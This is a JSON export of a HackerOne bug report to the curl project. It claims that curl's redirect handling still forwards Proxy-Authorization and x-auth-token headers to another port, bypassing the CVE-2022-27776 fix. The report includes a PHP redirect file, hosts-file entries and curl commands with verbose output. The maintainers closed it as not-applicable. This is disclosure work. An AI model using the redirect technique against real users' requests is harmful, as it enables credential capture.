{
  "id": 1568175,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTY4MTc1",
  "url": "https://hackerone.com/reports/1568175",
  "title": "Credential leak on redirect",
  "state": "Closed",
  "substate": "not-applicable",
  "severity_rating": "medium",
  "readable_substate": "N/A",
  "created_at": "2022-05-13T11:31:21.465Z",
  "submitted_at": "2022-05-13T11:31:21.548Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "iylz",
    "url": "/iylz",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 35663,
    "url": "https://hackerone.com/curl",
    "handle": "curl",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "curl",
      "twitter_handle": "",
      "website": "https://curl.se",
      "about": "cURL is an Open Source project providing a library and command-line tool for doing internet transfers"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2022-27776"
  ],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2022-05-14T16:06:25.527Z",
  "bug_reporter_agreed_on_going_public_at": "2022-05-14T16:06:25.474Z",
  "team_member_agreed_on_going_public_at": "2022-05-14T16:01:34.568Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\n[add summary of the vulnerability]\n\nCurl can be coaxed to leak user credentials to third-party host by issuing HTTP redirect , like the Proxy-Authorization „ÄÅx-auth-token header. It is a bypass of fix https://hackerone.com/reports/1547048 , CVE-2022-27776 .\n\n## Steps To Reproduce:\n[add details for how we can reproduce the issue]\n\n  1. Create a 302.php file, such as:\n```\n<?php\nheader(\"Location: http://a.com:8000\");\n?>\n```\nAdd the 2 record in the /etc/hosts file:  \n```\n127.0.0.1 a.com\n127.0.0.1 b.com\n```\n  2. curl -H \"Proxy-Authorization: secrettoken\" http://b.com/302.php -vv -L \nThe redirect will be followed, and the confidential headers sent over insecure HTTP to the specified port:\n```\n# curl -H \"Proxy-Authorization: secrettoken\" http://b.com/302.php -vv -L\n*   Trying 127.0.0.1:80...\n* Connected to b.com (127.0.0.1) port 80 (#0)\n> GET /302.php HTTP/1.1\n> Host: b.com\n> User-Agent: curl/7.83.1\n> Accept: */*\n> Proxy-Authorization: secrettoken\n>\n* Mark bundle as not supporting multiuse\n< HTTP/1.1 302 Found\n< Date: Fri, 13 May 2022 11:22:06 GMT\n< Server: Apache/2.4.6 (CentOS) PHP/5.4.16\n< X-Powered-By: PHP/5.4.16\n< Location: http://a.com:8000\n< Content-Length: 0\n< Content-Type: text/html; charset=UTF-8\n<\n* Connection #0 to host b.com left intact\n* Clear auth, redirects to port from 80 to 8000\n* Issue another request to this URL: 'http://a.com:8000/'\n*   Trying 127.0.0.1:8000...\n* Connected to a.com (127.0.0.1) port 8000 (#1)\n> GET / HTTP/1.1\n> Host: a.com:8000\n> User-Agent: curl/7.83.1\n> Accept: */*\n> Proxy-Authorization: secrettoken\n>\n```\n  3.  curl -H \"x-auth-token: secrettoken\" http://b.com/302.php -vv -L \n```\n# curl -H \"x-auth-token: secrettoken\" http://b.com/302.php -vv -L\n*   Trying 127.0.0.1:80...\n* Connected to b.com (127.0.0.1) port 80 (#0)\n> GET /302.php HTTP/1.1\n> Host: b.com\n> User-Agent: curl/7.83.1\n> Accept: */*\n> x-auth-token: secrettoken\n>\n* Mark bundle as not supporting multiuse\n< HTTP/1.1 302 Found\n< Date: Fri, 13 May 2022 11:24:15 GMT\n< Server: Apache/2.4.6 (CentOS) PHP/5.4.16\n< X-Powered-By: PHP/5.4.16\n< Location: http://a.com:8000\n< Content-Length: 0\n< Content-Type: text/html; charset=UTF-8\n<\n* Connection #0 to host b.com left intact\n* Clear auth, redirects to port from 80 to 8000\n* Issue another request to this URL: 'http://a.com:8000/'\n*   Trying 127.0.0.1:8000...\n* Connected to a.com (127.0.0.1) port 8000 (#1)\n> GET / HTTP/1.1\n> Host: a.com:8000\n> User-Agent: curl/7.83.1\n> Accept: */*\n> x-auth-token: secrettoken\n```\n\nThe reason for the problem is that curl's filtering of authentication header header is incomplete. The Proxy-Authorization and x-auth-token headers are not considered, only restrict the delivery of Cookies and Authorization.\n\n## Supporting Material/References:\n[list any additional material (e.g. screenshots, logs, etc.)]\n\n  * [attachment / reference]\nhttps://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Proxy-Authorization\n\n## Impact\n\nLeak of Proxy-Authorization and x-auth-token headers.",
  "weakness": {
    "id": 87,
    "name": "Insufficiently Protected Credentials"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 4,
  "voters": [
    "h4x0r_dz",
    "shivammusic",
    "mzm_zulfuqarov",
    "ittafunahashi"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 18844,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/curl/curl",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
